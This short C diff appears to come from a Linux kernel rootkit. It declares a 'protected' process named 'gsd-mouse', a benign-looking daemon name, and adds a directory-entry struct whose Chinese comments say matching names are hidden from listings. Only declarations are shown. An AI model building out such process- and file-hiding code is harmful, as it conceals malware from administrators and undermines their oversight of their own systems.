@@ -20,6 +20,14 @@
 #define FLAG 0x80000000
 const char *protected = "gsd-mouse";
 int protected_pid = -1;
+
+
+struct linux_dirent{  //目录文件（directory file）的概念：这种文件包含了其他文件的名字以及指向与这些文件有关的信息的指针
+    unsigned long     d_ino;/* inode number 索引节点号 */  
+    unsigned long     d_off;/* offset to this dirent 在目录文件中的偏移 */  
+    unsigned short    d_reclen; /* length of this d_name 文件名长 */  
+    char    d_name[1]; //目录下面项的名字，如果发现这个名字跟想要隐藏的名字相同，那么就不显示。&&&&&&&&
+};
 // int myatoi(char *str)
 // {
 // 　　int res = 0;
